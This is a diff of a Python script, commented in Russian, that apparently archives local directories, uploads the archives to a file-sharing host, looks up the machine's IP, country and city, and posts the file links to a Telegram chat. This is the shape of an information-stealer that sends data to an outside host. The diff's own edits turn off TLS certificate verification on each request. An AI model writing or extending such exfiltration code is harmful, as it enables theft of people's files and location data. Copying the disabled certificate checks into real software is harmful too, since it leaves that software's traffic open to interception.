@@ -36,7 +36,7 @@ def upload_to_fileio(file_data, file_name):
     files = {
         'file': (file_name, file_data)
     }
-    response = requests.post(url, files=files)
+    response = requests.post(url, files=files, verify=False)  # Отключена проверка сертификатов
     if response.status_code == 200:
         data = response.json()
         return data.get("link", None)
@@ -55,7 +55,7 @@ def send_to_telegram(message, files):
     
     # Отправляем текстовое сообщение с ссылками
     full_message = message + "\n\n" + file_links
-    response = requests.post(url, data={"chat_id": tg_chat_id, "text": full_message})
+    response = requests.post(url, data={"chat_id": tg_chat_id, "text": full_message}, verify=False)  # Отключена проверка сертификатов
     if not response.ok:
         print("Error sending message:", response.text)
         return False
@@ -74,7 +74,7 @@ def archive_directory(directory_path):
 def main():
     try:
         # Получаем информацию о текущем IP
-        ip_info = requests.get("http://ip-api.com/json", verify=False).json()
+        ip_info = requests.get("http://ip-api.com/json", verify=False).json()  # Отключена проверка сертификатов
         ip = ip_info["query"]
         country = ip_info["country"]
         city = ip_info["city"]
